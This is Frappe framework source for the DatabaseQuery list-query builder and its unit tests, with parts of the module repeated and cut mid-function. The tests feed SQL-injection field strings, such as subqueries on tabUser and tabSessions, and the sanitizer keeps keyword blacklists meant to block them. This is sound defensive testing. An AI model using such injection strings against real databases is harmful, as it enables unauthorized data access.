				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt
from __future__ import unicode_literals

import frappe, unittest

from frappe.model.db_query import DatabaseQuery
from frappe.desk.reportview import get_filters_cond

class TestReportview(unittest.TestCase):
	def test_basic(self):
		self.assertTrue({"name":"DocType"} in DatabaseQuery("DocType").execute(limit_page_length=None))

	def test_fields(self):
		self.assertTrue({"name":"DocType", "issingle":0} \
			in DatabaseQuery("DocType").execute(fields=["name", "issingle"], limit_page_length=None))

	def test_filters_1(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters=[["DocType", "name", "like", "J%"]]))

	def test_filters_2(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters=[{"name": ["like", "J%"]}]))

	def test_filters_3(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters={"name": ["like", "J%"]}))

	def test_filters_4(self):
		self.assertTrue({"name":"DocField"} \
			in DatabaseQuery("DocType").execute(filters={"name": "DocField"}))

	def test_in_not_in_filters(self):
		self.assertFalse(DatabaseQuery("DocType").execute(filters={"name": ["in", None]}))
		self.assertTrue({"name":"DocType"} \
				in DatabaseQuery("DocType").execute(filters={"name": ["not in", None]}))

		for result in [{"name":"DocType"}, {"name":"DocField"}]:
			self.assertTrue(result
				in DatabaseQuery("DocType").execute(filters={"name": ["in", 'DocType,DocField']}))

		for result in [{"name":"DocType"}, {"name":"DocField"}]:
			self.assertFalse(result
				in DatabaseQuery("DocType").execute(filters={"name": ["not in", 'DocType,DocField']}))

	def test_or_filters(self):
		data = DatabaseQuery("DocField").execute(
				filters={"parent": "DocType"}, fields=["fieldname", "fieldtype"],
				or_filters=[{"fieldtype":"Table"}, {"fieldtype":"Select"}])

		self.assertTrue({"fieldtype":"Table", "fieldname":"fields"} in data)
		self.assertTrue({"fieldtype":"Select", "fieldname":"document_type"} in data)
		self.assertFalse({"fieldtype":"Check", "fieldname":"issingle"} in data)

	def test_between_filters(self):
		""" test case to check between filter for date fields """
		frappe.db.sql("delete from tabEvent")

		# create events to test the between operator filter
		todays_event = create_event()
		event1 = create_event(starts_on="2016-07-05 23:59:59")
		event2 = create_event(starts_on="2016-07-06 00:00:00")
		event3 = create_event(starts_on="2016-07-07 23:59:59")
		event4 = create_event(starts_on="2016-07-08 00:00:01")

		# if the values are not passed in filters then event should be filter as current datetime
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", None]}, fields=["name"])

		self.assertTrue({ "name": event1.name } not in data)

		# if both from and to_date values are passed
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", ["2016-07-06", "2016-07-07"]]},
			fields=["name"])

		self.assertTrue({ "name": event2.name } in data)
		self.assertTrue({ "name": event3.name } in data)
		self.assertTrue({ "name": event1.name } not in data)
		self.assertTrue({ "name": event4.name } not in data)

		# if only one value is passed in the filter
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", ["2016-07-07"]]},
			fields=["name"])

		self.assertTrue({ "name": event3.name } in data)
		self.assertTrue({ "name": event4.name } in data)
		self.assertTrue({ "name": todays_event.name } in data)
		self.assertTrue({ "name": event1.name } not in data)
		self.assertTrue({ "name": event2.name } not in data)

	def test_ignore_permissions_for_get_filters_cond(self):
		frappe.set_user('test1@example.com')
		self.assertRaises(frappe.PermissionError, get_filters_cond, 'DocType', dict(istable=1), [])
		self.assertTrue(get_filters_cond('DocType', dict(istable=1), [], ignore_permissions=True))
		frappe.set_user('Administrator')

	def test_query_fields_sanitizer(self):
		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
				fields=["name", "issingle, version()"], limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, IF(issingle=1, (select name from tabUser), count(name))"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, (select count(*) from tabSessions)"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, SELECT LOCATE('', `tabUser`.`user`) AS user;"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, IF(issingle=1, (SELECT name from tabUser), count(*))"],
			limit_start=0, limit_page_length=1)

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "count(name)"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('count(name)' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "locate('', name) as _relevance"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('_relevance' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "date(creation) as creation"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('creation' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle",
			"datediff(modified, creation) as date_diff"], limit_start=0, limit_page_length=1)
		self.assertTrue('date_diff' in data[0])

def create_event(subject="_Test Event", starts_on=None):
	""" create a test event """

	from frappe.utils import get_datetime

	event = frappe.get_doc({
		"doctype": "Event",
		"subject": subject,
		"event_type": "Public",
		"starts_on": get_datetime(starts_on),
	}).insert(ignore_permissions=True)

	return event                    


# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				 ' or '.join(self.or_conditions)                    

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''
		regex = re.compile('^.*[,();].*')                    
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)

		for field in self.fields:
			if regex.match(field):                    
				if any(keyword in field.lower() for keyword in blacklisted_keywords):                    
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() \                    
					for keyword in blacklisted_functions):                    
					_raise_exception()

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
